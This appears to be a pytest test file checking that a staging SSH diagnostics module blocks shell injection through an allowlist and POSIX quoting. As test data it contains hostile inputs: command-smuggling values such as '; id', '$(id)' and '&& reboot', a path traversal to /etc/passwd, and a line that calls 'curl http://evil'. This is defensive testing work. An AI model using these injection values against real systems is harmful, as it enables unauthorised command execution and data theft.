"""Staging typed-parameter allowlist + remote quoting (OpenSSH shell semantics)."""

from __future__ import annotations

from types import SimpleNamespace

import pytest

from aichestra.security.staging_ops import (
    build_op,
    posix_single_quote,
    quote_remote_argv,
)
from aichestra.security.staging_ssh import StagingAlias, build_ssh_argv, run_staging_diagnostic


@pytest.mark.parametrize(
    "kwargs",
    [
        {"path": "/tmp/foo; id"},
        {"path": "/tmp/foo$(id)"},
        {"path": "/tmp/foo`id`"},
        {"path": "/tmp/foo && id"},
        {"path": "/tmp/foo|id"},
        {"path": "/tmp/foo\nid"},
        {"path": "../etc/passwd"},
        {"path": "/tmp/foo bar"},
    ],
)
def test_cat_path_injection_rejected_by_allowlist(kwargs: dict) -> None:
    with pytest.raises(ValueError, match="allowlist"):
        build_op("cat_file", **kwargs)


@pytest.mark.parametrize(
    "service",
    ["nginx;id", "nginx$(id)", "nginx`id`", "nginx && reboot", ""],
)
def test_service_injection_rejected(service: str) -> None:
    with pytest.raises(ValueError, match="allowlist|required"):
        build_op("service_status", service=service)


def test_url_injection_rejected() -> None:
    with pytest.raises(ValueError, match="allowlist"):
        build_op("curl_health", url="https://example.com/$(id)")
    with pytest.raises(ValueError, match="allowlist"):
        build_op("curl_health", url="https://example.com/; curl evil")


def test_posix_quoting_prevents_extra_remote_command() -> None:
    # Even a malicious token becomes a single shell word when quoted.
    malicious = "/tmp/x; curl http://evil"
    quoted = posix_single_quote(malicious)
    remote = quote_remote_argv(["cat", malicious])
    assert remote == f"'cat' {quoted}"
    # Remote shell would not treat `;` as a command separator inside quotes.
    assert remote.count("'") >= 4
    assert "; curl" in remote  # still present as data…
    # …but only inside the final quoted argument, not as a new command token.
    assert remote.endswith(quoted)


def test_typed_injection_never_reaches_executor() -> None:
    called = {"n": 0}

    def executor(_argv):
        called["n"] += 1
        return SimpleNamespace(returncode=0, stdout="pwned", stderr="")

    with pytest.raises(ValueError, match="allowlist"):
        run_staging_diagnostic(
            alias_name="stg",
            op_kind="cat_file",
            op_params={"path": "/var/log/app.log; id"},
            config={
                "staging": {
                    "aliases": {
                        "stg": {"host": "stg.example", "environment": "staging"}
                    }
                }
            },
            executor=executor,
        )
    assert called["n"] == 0


def test_build_ssh_argv_quotes_entire_remote_command() -> None:
    alias = StagingAlias(name="stg", host="stg.example", user="deploy")
    argv = build_ssh_argv(alias, ["tail", "-n", "20", "/var/log/app.log"])
    assert argv[-1] == "'tail' '-n' '20' '/var/log/app.log'"
    assert argv[-2].endswith("stg.example")


def test_safe_typed_paths_still_build() -> None:
    op = build_op("cat_file", path="/var/log/app.log")
    assert op.argv == ("cat", "/var/log/app.log")
    op2 = build_op("tail_log", path="/var/log/syslog", lines="100")
    assert op2.argv == ("tail", "-n", "100", "/var/log/syslog")
    op3 = build_op("curl_health", url="https://stg.example/health")
    assert op3.argv[0] == "curl"
